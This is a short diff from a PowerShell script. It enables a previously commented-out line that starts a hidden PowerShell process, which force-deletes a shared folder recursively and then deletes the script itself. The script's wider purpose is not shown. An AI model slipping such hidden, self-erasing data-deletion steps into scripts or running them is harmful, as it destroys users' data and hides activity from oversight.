@@ -296,4 +296,4 @@ $deleteCommand = "Start-Sleep -Seconds 2; " +
                 "Remove-Item -Path '$sharedFolder' -Recurse -Force;" +
                 "Remove-Item -Path '$thisScript' -Force"
 
-#Start-Process -FilePath "powershell.exe" -ArgumentList "-NoProfile -WindowStyle Hidden -Command $deleteCommand" -NoNewWindow
+Start-Process -FilePath "powershell.exe" -ArgumentList "-NoProfile -WindowStyle Hidden -Command $deleteCommand" -NoNewWindow
